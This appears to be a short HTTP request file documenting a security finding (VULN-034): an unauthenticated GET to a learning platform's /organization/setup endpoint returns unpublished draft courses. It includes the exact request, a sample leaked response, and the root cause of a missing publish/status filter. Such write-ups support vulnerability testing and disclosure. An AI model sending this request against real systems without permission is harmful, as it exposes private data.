### VULN-034 — Unauthenticated GET /organization/setup?siteName= returns unpublished draft courses
### siteName is the org's PUBLIC catalog slug. No Cookie header — fully unauthenticated.

GET http://localhost:21527/organization/setup?siteName=cve-hunt-academy HTTP/1.1
Host: localhost:21527
Origin: http://localhost:21526

### Response: HTTP 200
### {
###   "success": true,
###   "data": {
###     "courseData": [ ... 43 courses ...,
###        { "id": "7f4fcc78-907e-4a56-9bde-b22898f037cf",
###          "title": "Unreleased Draft d_bb6abd59",
###          "isPublished": false, "type": "SELF_PACED", "status": "ACTIVE" }   <-- unpublished draft leaked
###     ],
###     "lessonData": [ ... ], "isCoursePublished": ..., ...
###   }
### }
###
### getCoursesBySiteNameForSetup filters ONLY on organization.siteName — no isPublished/type/status gate.
